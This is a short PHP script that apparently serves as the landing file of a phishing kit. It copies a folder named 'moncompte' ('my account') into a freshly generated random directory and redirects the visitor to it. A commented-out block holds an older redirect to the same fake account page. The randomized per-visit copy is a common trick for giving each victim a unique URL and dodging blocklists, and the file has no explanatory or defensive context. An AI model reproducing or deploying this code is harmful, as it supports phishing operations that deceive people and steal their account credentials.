<?php
/*
$md5 = md5(uniqid(time()));
$loc="moncompte/index.php?clientid=13698&default=".$md5;
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $loc; ?>">
<script type="text/javascript">
loc = "<?echo $loc; ?>"
self.location.replace(loc);
window.location = loc;
</script>
</head></html>
*/
?>
<?
$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="moncompte";
recurse_copy( $src, $dst );
header("location:$dst");
?>

